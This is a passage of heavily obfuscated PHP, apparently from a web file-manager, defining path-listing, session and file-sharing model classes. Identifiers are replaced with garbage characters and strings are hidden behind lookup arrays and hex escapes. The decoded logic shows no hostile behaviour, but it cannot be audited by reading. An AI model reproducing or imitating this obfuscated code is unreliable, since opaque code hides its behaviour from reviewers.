ÙÍ[$¹ „ˆ¾[607]] = $š£ğÌ€ö . $‰ÈÍå—È[$¹ „ˆ¾[90]][$¹ „ˆ¾[193]]; } protected function _listAppendPath(&$¡ŒÇœæç, $àÁú¬àü = false) { $˜ë€öê¥ =& $_SERVER[±Ö‰ô½¯]; static $’¡’Ñ° = array(); $Óú›–ôù = array(); $úÒĞ×œ¡ = array(); if ($àÁú¬àü) { return $’¡’Ñ°; } foreach ($¡ŒÇœæç as &$­Õïş‘) { $îÕÆàè· = $­Õïş‘[$˜ë€öê¥[193]]; if ($­Õïş‘[$˜ë€öê¥[497]] == $˜ë€öê¥[91] && $­Õïş‘[$˜ë€öê¥[192]] != 0) { $’¡’Ñ°[$îÕÆàè·] = $­Õïş‘[$˜ë€öê¥[32]]; } if ($­Õïş‘[$˜ë€öê¥[497]] == $˜ë€öê¥[91] && $­Õïş‘[$˜ë€öê¥[192]] == 0) { $’¡’Ñ°[$îÕÆàè·] = $this->_listAppendPathRoot($­Õïş‘, array()); } if (isset($úÒĞ×œ¡[$­Õïş‘[$˜ë€öê¥[601]]])) { continue; } $úÒĞ×œ¡[$­Õïş‘[$˜ë€öê¥[601]]] = !0; $¼üòÙ©Ë = $this->parentLevelArray($­Õïş‘[$˜ë€öê¥[601]]); foreach ($¼üòÙ©Ë as $Åé¡•öû => $†óïÕü) { if (isset($’¡’Ñ°[$†óïÕü])) { continue; } if ($Åé¡•öû == 0) { $’¡’Ñ°[$†óïÕü] = $this->_listAppendPathRoot($­Õïş‘, $¼üòÙ©Ë); } if ($Åé¡•öû != 0) { $Óú›–ôù[] = $†óïÕü; } } } unset($­Õïş‘); $Óú›–ôù = array_unique($Óú›–ôù); if (count($Óú›–ôù) > 0) { $Àâ‚½üÕ = array($˜ë€öê¥[503] => array($˜ë€öê¥[504], $Óú›–ôù)); if (count($Óú›–ôù) == 1) { $éğÓÓ®ª = $this->sourceInfo($Óú›–ôù[0]); $îĞ¸–µı = is_array($éğÓÓ®ª) ? array($éğÓÓ®ª) : !1; } else { $îĞ¸–µı = $this->field($˜ë€öê¥[608])->where($Àâ‚½üÕ)->select(); } if (!$îĞ¸–µı) { $îĞ¸–µı = array(); } foreach ($îĞ¸–µı as $™úØÎˆƒ) { $’¡’Ñ°[$™úØÎˆƒ[$˜ë€öê¥[193]]] = $™úØÎˆƒ[$˜ë€öê¥[32]]; } } $®…ë‹´ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $®ŠÒÁŠ = array(); foreach ($¡ŒÇœæç as &$­Õïş‘) { $ª˜÷Ôğë = $­Õïş‘[$˜ë€öê¥[601]]; $Õ„‹¦Æ = $˜ë€öê¥[12]; if (isset($®ŠÒÁŠ[$ª˜÷Ôğë])) { $Õ„‹¦Æ = $®ŠÒÁŠ[$ª˜÷Ôğë]; } else { $¼üòÙ©Ë = $this->parentLevelArray($­Õïş‘[$˜ë€öê¥[601]]); foreach ($¼üòÙ©Ë as $Åé¡•öû => $†óïÕü) { if (isset($’¡’Ñ°[$†óïÕü])) { $Õ„‹¦Æ .= $’¡’Ñ°[$†óïÕü] . $˜ë€öê¥[8]; } } $®ŠÒÁŠ[$ª˜÷Ôğë] = $Õ„‹¦Æ; } $Õ„‹¦Æ .= $­Õïş‘[$˜ë€öê¥[32]]; if ($­Õïş‘[$˜ë€öê¥[497]] == $˜ë€öê¥[91]) { $Õ„‹¦Æ .= $˜ë€öê¥[8]; } $­Õïş‘[$˜ë€öê¥[599]] = str_replace($˜ë€öê¥[256], $˜ë€öê¥[8], $Õ„‹¦Æ); if ($­Õïş‘[$˜ë€öê¥[192]] == $˜ë€öê¥[230]) { $­Õïş‘[$˜ë€öê¥[32]] = trim($’¡’Ñ°[$­Õïş‘[$˜ë€öê¥[193]]], $˜ë€öê¥[8]); $­Õïş‘[$˜ë€öê¥[599]] = $­Õïş‘[$˜ë€öê¥[32]] . $˜ë€öê¥[8]; } if (intval($­Õïş‘[$˜ë€öê¥[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($­Õïş‘, $¼üòÙ©Ë, $®…ë‹´); } } unset($­Õïş‘); return $¡ŒÇœæç; } private function _listAppendPathRecycle(&$¢°¹ÅÂğ, $ƒç¡ğ, $»õÇ‰³š) { $¿™ÇÀº— =& $_SERVER[±Ö‰ô½¯]; if (!in_array($»õÇ‰³š, $ƒç¡ğ) && $¢°¹ÅÂğ[$¿™ÇÀº—[193]] != $»õÇ‰³š) { return; } $§äë´¨¿ = explode($¿™ÇÀº—[8], trim($¢°¹ÅÂğ[$¿™ÇÀº—[599]], $¿™ÇÀº—[8])); $ö²Ö€Ù = implode($¿™ÇÀº—[8], array_slice($§äë´¨¿, 2)); $¢°¹ÅÂğ[$¿™ÇÀº—[599]] = $¿™ÇÀº—[8] . LNG($¿™ÇÀº—[609]) . $¿™ÇÀº—[8] . ltrim($ö²Ö€Ù, $¿™ÇÀº—[8]); $¢°¹ÅÂğ[$¿™ÇÀº—[601]] = $¿™ÇÀº—[610] . implode($¿™ÇÀº—[50], array_slice($ƒç¡ğ, 1)) . $¿™ÇÀº—[50]; if ($¢°¹ÅÂğ[$¿™ÇÀº—[193]] == $»õÇ‰³š) { $¢°¹ÅÂğ[$¿™ÇÀº—[601]] = $¿™ÇÀº—[610]; $¢°¹ÅÂğ[$¿™ÇÀº—[192]] = $¿™ÇÀº—[230]; $¢°¹ÅÂğ[$¿™ÇÀº—[32]] = LNG($¿™ÇÀº—[609]); } $¢°¹ÅÂğ[$¿™ÇÀº—[611]] = $¿™ÇÀº—[612]; } protected function _listAppendPathRoot(&$ˆ…ëÄ‰á, $¢Ûñø§) { $¨æ€ÇŒ =& $_SERVER[±Ö‰ô½¯]; static $ñ‹Â†¼ = false; static $Ü‹¨Ğº¿ = false; $…®í’ù = $¨æ€ÇŒ[12]; if ($ˆ…ëÄ‰á[$¨æ€ÇŒ[190]] == self::TYPE_USER) { if ($ˆ…ëÄ‰á[$¨æ€ÇŒ[586]] == USER_ID) { $…®í’ù = LNG($¨æ€ÇŒ[613]); if ($ñ‹Â†¼ === !1) { $˜·¿Õ¯• = Model($¨æ€ÇŒ[614])->getInfoFull(USER_ID); $ñ‹Â†¼ = _get($˜·¿Õ¯•, $¨æ€ÇŒ[615], $¨æ€ÇŒ[12]); } if ($Ü‹¨Ğº¿ === !1) { $˜·¿Õ¯• = Model($¨æ€ÇŒ[614])->getInfoFull(USER_ID); $Ü‹¨Ğº¿ = _get($˜·¿Õ¯•, $¨æ€ÇŒ[616], $¨æ€ÇŒ[12]); } if ($¢Ûñø§ && $¢Ûñø§[0] == $ñ‹Â†¼ || !$¢Ûñø§ && $ˆ…ëÄ‰á[$¨æ€ÇŒ[193]] == $ñ‹Â†¼) { $…®í’ù = LNG($¨æ€ÇŒ[617]); $ˆ…ëÄ‰á[$¨æ€ÇŒ[618]] = $¨æ€ÇŒ[619]; } if ($¢Ûñø§ && $¢Ûñø§[0] == $Ü‹¨Ğº¿ || !$¢Ûñø§ && $ˆ…ëÄ‰á[$¨æ€ÇŒ[193]] == $Ü‹¨Ğº¿) { $…®í’ù = $…®í’ù . $¨æ€ÇŒ[620] . LNG($¨æ€ÇŒ[621]); } if (!$¢Ûñø§) { $ˆ…ëÄ‰á[$¨æ€ÇŒ[32]] = $…®í’ù; } } else { $˜·¿Õ¯• = Model($¨æ€ÇŒ[614])->getInfoFull($ˆ…ëÄ‰á[$¨æ€ÇŒ[586]]); $Öİ¸ğûÏ = _get($˜·¿Õ¯•, $¨æ€ÇŒ[616], $¨æ€ÇŒ[12]); $ˆ…ëÄ‰á[$¨æ€ÇŒ[622]] = Model($¨æ€ÇŒ[594])->getInfoSimpleOuter($ˆ…ëÄ‰á[$¨æ€ÇŒ[586]]); $…®í’ù = LNG($¨æ€ÇŒ[623]) . $¨æ€ÇŒ[175] . $ˆ…ëÄ‰á[$¨æ€ÇŒ[622]][$¨æ€ÇŒ[32]] . $¨æ€ÇŒ[177]; if ($¢Ûñø§ && $¢Ûñø§[0] == $Öİ¸ğûÏ || !$¢Ûñø§ && $ˆ…ëÄ‰á[$¨æ€ÇŒ[193]] == $Öİ¸ğûÏ) { $…®í’ù = LNG($¨æ€ÇŒ[623]) . $¨æ€ÇŒ[624] . $ˆ…ëÄ‰á[$¨æ€ÇŒ[622]][$¨æ€ÇŒ[32]] . $¨æ€ÇŒ[620] . LNG($¨æ€ÇŒ[621]) . $¨æ€ÇŒ[177]; } } } else { if ($ˆ…ëÄ‰á[$¨æ€ÇŒ[190]] == self::TYPE_GROUP) { $›ˆª¸¥­ = Model($¨æ€ÇŒ[602])->getInfoSimple($ˆ…ëÄ‰á[$¨æ€ÇŒ[586]]); $…®í’ù = $›ˆª¸¥­[$¨æ€ÇŒ[32]]; } else { if ($ˆ…ëÄ‰á[$¨æ€ÇŒ[190]] == self::TYPE_SYSTEM) { $…®í’ù = $¨æ€ÇŒ[625]; } } } $…®í’ù = $…®í’ù ? $¨æ€ÇŒ[8] . $…®í’ù . $¨æ€ÇŒ[8] : $¨æ€ÇŒ[8]; return $…®í’ù; } protected function _listAppendUser(&$Ú«šŞµ») { $¶’ğ„¼š =& $_SERVER[±Ö‰ô½¯]; $ò¹òİò = array_to_keyvalue($Ú«šŞµ», $¶’ğ„¼š[12], $¶’ğ„¼š[538]); $¶Ó¯†¨² = array_to_keyvalue($Ú«šŞµ», $¶’ğ„¼š[12], $¶’ğ„¼š[540]); $˜şÓĞŞ€ = array_merge($ò¹òİò, $¶Ó¯†¨²); $™Ñ®…¦ = Model($¶’ğ„¼š[614])->userListInfo($˜şÓĞŞ€); foreach ($Ú«šŞµ» as &$•àçü±©) { $ÆÙ¬şôÖ = $•àçü±©[$¶’ğ„¼š[538]]; $•àçü±©[$¶’ğ„¼š[538]] = $™Ñ®…¦[$ÆÙ¬şôÖ] ? $™Ñ®…¦[$ÆÙ¬şôÖ] : !1; $ÆÙ¬şôÖ = $•àçü±©[$¶’ğ„¼š[540]]; $•àçü±©[$¶’ğ„¼š[540]] = $™Ñ®…¦[$ÆÙ¬şôÖ] ? $™Ñ®…¦[$ÆÙ¬şôÖ] : !1; if (_get($•àçü±©, $¶’ğ„¼š[626], 0)) { $âÍ©¥ÀÀ = $GLOBALS[$¶’ğ„¼š[6]][$¶’ğ„¼š[92]][$¶’ğ„¼š[627]]; if ($•àçü±©[$¶’ğ„¼š[552]][$¶’ğ„¼š[628]] <= time() - $âÍ©¥ÀÀ) { $this->metaSet($•àçü±©[$¶’ğ„¼š[193]], $¶’ğ„¼š[629], null); $this->metaSet($•àçü±©[$¶’ğ„¼š[193]], $¶’ğ„¼š[628], null); unset($•àçü±©[$¶’ğ„¼š[552]][$¶’ğ„¼š[629]]); continue; } $¿å·˜•æ = $•àçü±©[$¶’ğ„¼š[552]][$¶’ğ„¼š[629]]; $•àçü±©[$¶’ğ„¼š[552]][$¶’ğ„¼š[630]] = Model($¶’ğ„¼š[614])->getInfoSimpleOuter($¿å·˜•æ); } } unset($•àçü±©); } public function parentLevelArray($é‹ØäÒ) { $Ü¢â¹à„ =& $_SERVER[±Ö‰ô½¯]; $é‹ØäÒ = explode($Ü¢â¹à„[50], trim($é‹ØäÒ, $Ü¢â¹à„[50])); return array_to_int(array_filter($é‹ØäÒ)); } public function listAll($º¤Ñ‰¢–) { $ú¤Ø™•ì =& $_SERVER[±Ö‰ô½¯]; $¶‡ÔÛĞ¦ = $this->sourceInfo($º¤Ñ‰¢–); $©€‹ù• = array($ú¤Ø™•ì[631] => array($ú¤Ø™•ì[632], $¶‡ÔÛĞ¦[$ú¤Ø™•ì[601]] . $º¤Ñ‰¢– . $ú¤Ø™•ì[633]), $ú¤Ø™•ì[634] => 0); $…Ğó›£ = $ú¤Ø™•ì[635]; $ùÅ€®€ = "\114\x45\106\124\x20\x4a\117\x49\x4e\40{$this->tablePrefix}\151\157\x5f\146\x69\x6c\x65\40\146\x69\x6c\x65\40\x6f\156\40\163\157\x75\162\x63\x65\56\146\x69\154\145\111\104\x20\75\x20\146\x69\x6c\x65\x2e\x66\151\154\x65\111\104"; $Ùú¥Â = $this->alias($ú¤Ø™•ì[530])->field($…Ğó›£)->where($©€‹ù•)->join($ùÅ€®€)->select(); $this->_listAppendAuth($Ùú¥Â); $this->_listAppendUser($Ùú¥Â); $this->_listAppendPath($Ùú¥Â); $Ùú¥Â = array_to_keyvalue($Ùú¥Â, $ú¤Ø™•ì[193]); $×à†úÄø = "\57{$¶‡ÔÛĞ¦[$ú¤Ø™•ì[32]]}\57"; $×à†úÄø = $×à†úÄø == $ú¤Ø™•ì[256] ? $ú¤Ø™•ì[8] : $×à†úÄø; $Ñ‡ŒÇÃß = array(); foreach ($Ùú¥Â as $ò®®É´Ò => $Å‚çÎ¹É) { $‚¯ÔûŠ = $this->parentLevelArray($Å‚çÎ¹É[$ú¤Ø™•ì[601]]); array_shift($‚¯ÔûŠ); $¦¨Ñ¼ = $×à†úÄø; for ($ö‚Á‡îÕ = 0; $ö‚Á‡îÕ < count($‚¯ÔûŠ); $ö‚Á‡îÕ++) { $¦¨Ñ¼ .= $Ùú¥Â[$‚¯ÔûŠ[$ö‚Á‡îÕ]][$ú¤Ø™•ì[32]] . $ú¤Ø™•ì[8]; } $¦¨Ñ¼ .= $Å‚çÎ¹É[$ú¤Ø™•ì[32]]; if ($Å‚çÎ¹É[$ú¤Ø™•ì[497]]) { $¦¨Ñ¼ .= $ú¤Ø™•ì[8]; } $–ë„¯õĞ = array($ú¤Ø™•ì[507] => str_replace($ú¤Ø™•ì[256], $ú¤Ø™•ì[8], str_replace($ú¤Ø™•ì[256], $ú¤Ø™•ì[8], str_replace($ú¤Ø™•ì[256], $ú¤Ø™•ì[8], $¦¨Ñ¼))), $ú¤Ø™•ì[636] => intval($Å‚çÎ¹É[$ú¤Ø™•ì[497]]), $ú¤Ø™•ì[637] => intval($Å‚çÎ¹É[$ú¤Ø™•ì[79]]), $ú¤Ø™•ì[88] => intval($Å‚çÎ¹É[$ú¤Ø™•ì[88]]), $ú¤Ø™•ì[90] => $this->pathInfoFilter($Å‚çÎ¹É)); if (!$–ë„¯õĞ[$ú¤Ø™•ì[497]]) { $–ë„¯õĞ[$ú¤Ø™•ì[554]] = $Å‚çÎ¹É[$ú¤Ø™•ì[554]]; } $Ñ‡ŒÇÃß[] = $–ë„¯õĞ; } $Ñ‡ŒÇÃß = array_sort_by($Ñ‡ŒÇÃß, $ú¤Ø™•ì[87]); return $Ñ‡ŒÇÃß; } } goto Cé‹ÙÅƒàâ; AÁº¾Ã¿ÂÒ: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\145\x6d\x5f\x73\145\163\x73\x69\157\156"; public function get($¾èªÇİê) { $ÚæˆâÕƒ =& $_SERVER[±Ö‰ô½¯]; $³õÆ¶—® = $this->where(array($ÚæˆâÕƒ[2271] => $¾èªÇİê))->find(); if (!is_array($³õÆ¶—®)) { return !1; } return $³õÆ¶—®[$ÚæˆâÕƒ[170]]; } public function set($é“‡Ç…, $ªœß’Ø£, $ù•³†èü = 3600) { $¶‘è§ô =& $_SERVER[±Ö‰ô½¯]; $´“€Óñ = array($¶‘è§ô[2271] => $é“‡Ç…, $¶‘è§ô[2174] => $ªœß’Ø£, $¶‘è§ô[2272] => $ù•³†èü + time()); if (Session::get($¶‘è§ô[2273])) { $´“€Óñ[$¶‘è§ô[1542]] = Session::get($¶‘è§ô[2273]); } else { $´“€Óñ[$¶‘è§ô[1542]] = 0; } if ($this->get($é“‡Ç…)) { return $this->where(array($¶‘è§ô[2271] => $é“‡Ç…))->save($´“€Óñ); } else { return $this->add($´“€Óñ, array(), !0); } } public function remove($ ç•œø) { return $this->where(array($_SERVER[±Ö‰ô½¯][2271] => $ ç•œø))->delete(); } public function clearTimeout() { return $this->where($_SERVER[±Ö‰ô½¯][2274] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\162\145"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\171\x54\151\155\x65", "\x74\151\x6d\145", "\x69\156\163\x65\x72\x74\54\x75\x70\144\141\x74\x65", "\x66\x75\x6e\143\164\151\x6f\156"), array("\x63\x72\x65\x61\x74\145\x54\151\x6d\145", "\164\x69\x6d\x65", "\x69\x6e\163\145\162\x74", "\x66\165\x6e\x63\164\x69\157\x6e"), array("\x6f\160\164\x69\157\x6e\x73", '', "\x69\156\163\x65\162\164\54\165\160\144\x61\164\x65\54\x73\x65\154\145\x63\x74", "\152\x73\157\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($’ã‹‚Şà) { $£¥ß®¾® =& $_SERVER[±Ö‰ô½¯]; return array($£¥ß®¾®[2275] => array(USER_ID, $£¥ß®¾®[2276]), $£¥ß®¾®[2277] => array($’ã‹‚Şà[0], $£¥ß®¾®[2278])); } protected function ___listSimple() { $¹ÒÍåÒ = $this->field($this->fieldList)->where(array($_SERVER[±Ö‰ô½¯][1542] => USER_ID))->select(); return $¹ÒÍåÒ ? $¹ÒÍåÒ : array(); } protected function ___getInfoShare($ƒ¹±Íé†) { return $this->_getShareInfo(array($_SERVER[±Ö‰ô½¯][685] => $ƒ¹±Íé†), !1); } protected function getInfo($ÑÎİË‹´) { $¡ÅøÖ»Õ = $this->getInfoShare($ÑÎİË‹´); return $this->shareSourceInfo($¡ÅøÖ»Õ); } public function getInfoByHash($²ğå†•¡) { return $this->_getShareInfo(array($_SERVER[±Ö‰ô½¯][1504] => $²ğå†•¡)); } public function getInfoByPath($ÏšïÌÉû) { $·ÈÚ¿ÅÇ =& $_SERVER[±Ö‰ô½¯]; $Û†ÊÊĞÑ = array($·ÈÚ¿ÅÇ[1542] => USER_ID, $·ÈÚ¿ÅÇ[193] => $ÏšïÌÉû); return $this->_getShareInfo($Û†ÊÊĞÑ); } public function getInfoBySourcePath($Âş§¾—) { $ÔÑŸ•Ïƒ =& $_SERVER[±Ö‰ô½¯]; $¼´÷£ñÀ = array($ÔÑŸ•Ïƒ[1542] => USER_ID, $ÔÑŸ•Ïƒ[580] => $Âş§¾—); return $this->_getShareInfo($¼´÷£ñÀ); } private function _getShareInfo($Ê“µ¢òõ, $“ÓÛÀúÁ = true) { $Ë«©ûÒ =& $_SERVER[±Ö‰ô½¯]; $¨±áı’‰ = $this->where($Ê“µ¢òõ)->find(); if (!$¨±áı’‰) { return !1; } if (!is_array($¨±áı’‰[$Ë«©ûÒ[577]])) { $¨±áı’‰[$Ë«©ûÒ[577]] = array(); } $Ê“µ¢òõ = array($Ë«©ûÒ[685] => $¨±áı’‰[$Ë«©ûÒ[685]]); $¦òëÚïŠ = $Ë«©ûÒ[2279]; $¨±áı’‰[$Ë«©ûÒ[1500]] = Model($Ë«©ûÒ[686])->order($Ë«©ûÒ[484])->field($¦òëÚïŠ)->where($Ê“µ¢òõ)->select(); if (!$“ÓÛÀúÁ) { return $¨±áı’‰; } return $this->shareSourceInfo($¨±áı’‰); } private function shareSourceInfo($ĞÜî “À) { $¢ÊÁï•ï =& $_SERVER[±Ö‰ô½¯]; if (!is_array($ĞÜî “À)) { return $ĞÜî “À; } if ($ĞÜî “À[$¢ÊÁï•ï[193]] == $¢ÊÁï•ï[230]) { $ĞÜî “À[$¢ÊÁï•ï[90]] = IO::info($ĞÜî “À[$¢ÊÁï•ï[580]]); } else { $ĞÜî “À[$¢ÊÁï•ï[90]] = Model($¢ÊÁï•ï[1482])->pathInfo($ĞÜî “À[$¢ÊÁï•ï[193]]); } return $ĞÜî “À; } protected function getInfoAuth($À²Âî) { $©–Ö«µ¥ =& $_SERVER[±Ö‰ô½¯]; $¾ÁôÌû = $this->getInfo($À²Âî); if ($¾ÁôÌû[$©–Ö«µ¥[1542]] == USER_ID) { $¾ÁôÌû[$©–Ö«µ¥[499]] = $¾ÁôÌû[$©–Ö«µ¥[90]][$©–Ö«µ¥[499]]; } else { $¾ÁôÌû[$©–Ö«µ¥[499]] = Model($©–Ö«µ¥[584])->authMake($¾ÁôÌû[$©–Ö«µ¥[1500]]); } return $¾ÁôÌû; } protected function listData($ñ´Î›» = null, $àŠ¨Ú = 300) { $¬Ì¤´ñ =& $_SERVER[±Ö‰ô½¯]; $ÈÀ’Ó·‘ = array(array($¬Ì¤´ñ[575] => array($¬Ì¤´ñ[1128], 0), $¬Ì¤´ñ[683] => array($¬Ì¤´ñ[1128], 0), $¬Ì¤´ñ[2280] => $¬Ì¤´ñ[2236])); if ($ñ´Î›» == $¬Ì¤´ñ[2281]) { $ÈÀ’Ó·‘ = array($¬Ì¤´ñ[575] => 1); } else { if ($ñ´Î›» == $¬Ì¤´ñ[1293]) { $ÈÀ’Ó·‘ = array($¬Ì¤´ñ[683] => 1); } } $ÈÀ’Ó·‘[$¬Ì¤´ñ[1542]] = USER_ID; $À³İÆ³¶ = $this->where($ÈÀ’Ó·‘)->selectPage($àŠ¨Ú); return $À³İÆ³¶; } protected function listToMe($ÅÀá†ÙÈ = 300) { $ĞÂå”Êğ =& $_SERVER[±Ö‰ô½¯]; $àãï„ˆ¼ = Model($ĞÂå”Êğ[2282])->userGroupParents(USER_ID); $­‘¼ñù = array($ĞÂå”Êğ[668] => SourceModel::TYPE_USER, $ĞÂå”Êğ[586] => USER_ID); if ($àãï„ˆ¼) { $­‘¼ñù = array(array($ĞÂå”Êğ[668] => SourceModel::TYPE_USER, $ĞÂå”Êğ[586] => USER_ID), array($ĞÂå”Êğ[668] => SourceModel::TYPE_GROUP, $ĞÂå”Êğ[586] => array($ĞÂå”Êğ[7], $àãï„ˆ¼)), $ĞÂå”Êğ[2280] => $ĞÂå”Êğ[2236]); } $¿ÎÎÒØ¨ = Model($ĞÂå”Êğ[686])->where($­‘¼ñù)->selectPage($ÅÀá†ÙÈ); $òü¤ä³ã = array_to_keyvalue_group($¿ÎÎÒØ¨[$ĞÂå”Êğ[447]], $ĞÂå”Êğ[685]); if (!$òü¤ä³ã) { return $¿ÎÎÒØ¨; } $¬«¥ã—Å = $ĞÂå”Êğ[2283]; $­‘¼ñù = array($ĞÂå”Êğ[685] => array($ĞÂå”Êğ[504], array_keys($òü¤ä³ã))); $ïôàÂ¿û = $this->field($¬«¥ã—Å)->where($­‘¼ñù)->select(); foreach ($ïôàÂ¿û as $†¿á¶û => &$ÀĞ»Æ»×) { $ÀĞ»Æ»×[$ĞÂå”Êğ[1500]] = $òü¤ä³ã[$ÀĞ»Æ»×[$ĞÂå”Êğ[685]]]; } unset($ÀĞ»Æ»×); $Ã÷˜äö = array($ĞÂå”Êğ[2284] => $ïôàÂ¿û, $ĞÂå”Êğ[2285] => $¿ÎÎÒØ¨[$ĞÂå”Êğ[444]]); return $Ã÷˜äö; } protected function shareAdd($º¤…ÀÊ, $»»×®¤Ì) { $‡øŞ¾¾ =& $_SERVER[±Ö‰ô½¯]; $ä®ãÍÏª = $this->_addShareData($º¤…ÀÊ, $»»×®¤Ì); if (!empty($»»×®¤Ì[$‡øŞ¾¾[2286]])) { $this->_shareAuthSet($ä®ãÍÏª, $»»×®¤Ì[$‡øŞ¾¾[2286]]); } $this->shareEventAdd($º¤…ÀÊ, $»»×®¤Ì, $‡øŞ¾¾[2287]); return $ä®ãÍÏª; } protected function shareAddSystem($‹Õ×©Ë, $™½»Çœ) { $„¥ÚìÃ =& $_SERVER[±Ö‰ô½¯]; $ØÃ±–æõ = $this->_addShareData($‹Õ×©Ë, $™½»Çœ, $„¥ÚìÃ[191]); $this->_shareAuthSet($ØÃ±–æõ, $™½»Çœ[$„¥ÚìÃ[2286]]); return $ØÃ±–æõ; } private function shareEventAdd($¹¯¬ŸÂ», $ÄÎƒ†ÙÍ, $×äÒ±ú = "\141\144\x64") { $æªÇ‡Ö =& $_SERVER[±Ö‰ô½¯]; if (!$¹¯¬ŸÂ» || $¹¯¬ŸÂ» == $æªÇ‡Ö[230]) { return; } if ($×äÒ±ú == $æªÇ‡Ö[2287]) { if ($ÄÎƒ†ÙÍ[$æªÇ‡Ö[575]] == $æªÇ‡Ö[91]) { Model($æªÇ‡Ö[653])->eventShare($¹¯¬ŸÂ», $æªÇ‡Ö[2288]); } if ($ÄÎƒ†ÙÍ[$æªÇ‡Ö[683]] == $æªÇ‡Ö[91]) { Model($æªÇ‡Ö[653])->eventShare($¹¯¬ŸÂ», $æªÇ‡Ö[2289]); } return; } $ÀøÓœ—ë = $this->getInfoByPath($¹¯¬ŸÂ»); $ùİÁÛ²ô = $æªÇ‡Ö[2290]; if ($ÀøÓœ—ë[$æªÇ‡Ö[575]] == $æªÇ‡Ö[230] && $ÄÎƒ†ÙÍ[$æªÇ‡Ö[575]] == $æªÇ‡Ö[91]) { $ùİÁÛ²ô = $æªÇ‡Ö[2288]; } if ($ÀøÓœ—ë[$æªÇ‡Ö[575]] == $æªÇ‡Ö[91] && $ÄÎƒ†ÙÍ[$æªÇ‡Ö[575]] == $æªÇ‡Ö[230]) { $ùİÁÛ²ô = $æªÇ‡Ö[2291]; } if ($ÀøÓœ—ë[$æªÇ‡Ö[683]] == $æªÇ‡Ö[230] && $ÄÎƒ†ÙÍ[$æªÇ‡Ö[683]] == $æªÇ‡Ö[91]) { $ùİÁÛ²ô = $æªÇ‡Ö[2289]; } if ($ÀøÓœ—ë[$æªÇ‡Ö[683]] == $æªÇ‡Ö[91] && $ÄÎƒ†ÙÍ[$æªÇ‡Ö[683]] == $æªÇ‡Ö[230]) { $ùİÁÛ²ô = $æªÇ‡Ö[2292]; } Model($æªÇ‡Ö[653])->eventShare($¹¯¬ŸÂ», $ùİÁÛ²ô); return; } private function _addShareData($ÀØ•àÖÂ, $áÂãÎ„Â = array(), $Ì›áê¥ = false) { $¬ëƒ¼•“ =& $_SERVER[±Ö‰ô½¯]; $§ƒ‹éù¸ = $Ì›áê¥ == $¬ëƒ¼•“[191] ? 0 : USER_ID; $®˜‚ÆÆÊ = array($¬ëƒ¼•“[503] => $ÀØ•àÖÂ, $¬ëƒ¼•“[1921] => $§ƒ‹éù¸); if ($ÀØ•àÖÂ == 0) { $®˜‚ÆÆÊ = array($¬ëƒ¼•“[2293] => $áÂãÎ„Â[$¬ëƒ¼•“[580]], $¬ëƒ¼•“[1921] => $§ƒ‹éù¸); } if ($¤×ìš¤— = $this->where($®˜‚ÆÆÊ)->find()) { return $¤×ìš¤—[$¬ëƒ¼•“[685]]; } if ($ÀØ•àÖÂ == 0) { $°¢Ë„Ğ = array($¬ëƒ¼•“[32] => get_path_this($áÂãÎ„Â[$¬ëƒ¼•“[87]])); } else { $°¢Ë„Ğ = Model($¬ëƒ¼•“[930])->sourceInfo($ÀØ•àÖÂ); if (!$°¢Ë„Ğ) { return !1; } } if (!$áÂãÎ„Â[$¬ëƒ¼•“[1815]]) { $áÂãÎ„Â[$¬ëƒ¼•“[1815]] = $°¢Ë„Ğ[$¬ëƒ¼•“[32]]; } $«ş»·Ü = array($¬ëƒ¼•“[1921] => $§ƒ‹éù¸, $¬ëƒ¼•“[503] => $ÀØ•àÖÂ, $¬ëƒ¼•“[1815] => $¬ëƒ¼•“[12], $¬ëƒ¼•“[575] => 0, $¬ëƒ¼•“[683] => 0, $¬ëƒ¼•“[580] => $¬ëƒ¼•“[12], $¬ëƒ¼•“[384] => $¬ëƒ¼•“[12], $¬ëƒ¼•“[1002] => $¬ëƒ¼•“[12], $¬ëƒ¼•“[2294] => 0, $¬ëƒ¼•“[2295] => 0, $¬ëƒ¼•“[859] => 0, $¬ëƒ¼•“[577] => $¬ëƒ¼•“[12], $¬ëƒ¼•“[1504] => $¬ëƒ¼•“[12]); $ŒÙùïåî = explode($¬ëƒ¼•“[50], $¬ëƒ¼•“[2296]); foreach ($ŒÙùïåî as $ò¼ˆşÒ¾) { if (!isset($áÂãÎ„Â[$ò¼ˆşÒ¾])) { continue; } $«ş»·Ü[$ò¼ˆşÒ¾] = $áÂãÎ„Â[$ò¼ˆşÒ¾]; } $Ú´ÌÀÀé = $this->add($«ş»·Ü); $ÄÚï­Äë = array($¬ëƒ¼•“[1504] => short_id($Ú´ÌÀÀé)); if ($this->where($ÄÚï­Äë)->find()) { $ÄÚï­Äë[$¬ëƒ¼•“[1504]] .= $¬ëƒ¼•“[474] . rand_string(2, 3); } $this->where(array($¬ëƒ¼•“[2297] => $Ú´ÌÀÀé))->save($ÄÚï­Äë); return $Ú´ÌÀÀé; } private function _shareAuthSet($Úê²‰„ˆ, $Š¦ƒÂ±å) { $äè¿’İ­ =& $_SERVER[±Ö‰ô½¯]; if (!is_array($Š¦ƒÂ±å)) { return !1; } $Ì×åØ×ö = Model($äè¿’İ­[2245]); $Ì×åØ×ö->where(array($äè¿’İ­[685] => $Úê²‰„ˆ))->delete(); $ö‚îÆš§ = array(); foreach ($Š¦ƒÂ±å as $¼ÈµÔÛ±) { $²‚õ‘—ø = SourceModel::TYPE_USER; if ($¼ÈµÔÛ±[$äè¿’İ­[190]] == SourceModel::TYPE_GROUP) { $²‚õ‘—ø = SourceModel::TYPE_GROUP; } $ÂËàÍ¼Ì = array($äè¿’İ­[685] => $Úê²‰„ˆ, $äè¿’İ­[190] => $²‚õ‘—ø, $äè¿’İ­[586] => intval($¼ÈµÔÛ±[$äè¿’İ­[586]]), $äè¿’İ­[1589] => 0, $äè¿’İ­[2298] => -1); if ($¼ÈµÔÛ±[$äè¿’İ­[1589]]) { $ÂËàÍ¼Ì[$äè¿’İ­[1589]] = $¼ÈµÔÛ±[$äè¿’İ­[1589]]; } else { if ($¼ÈµÔÛ±[$äè¿’İ­[2298]]) { $ÂËàÍ¼Ì[$äè¿’İ­[2298]] = $¼ÈµÔÛ±[$äè¿’İ­[2298]]; } } $ö‚îÆš§[] = $ÂËàÍ¼Ì; } return $Ì×åØ×ö->addAll($ö‚îÆš§, array(), !0); } public function 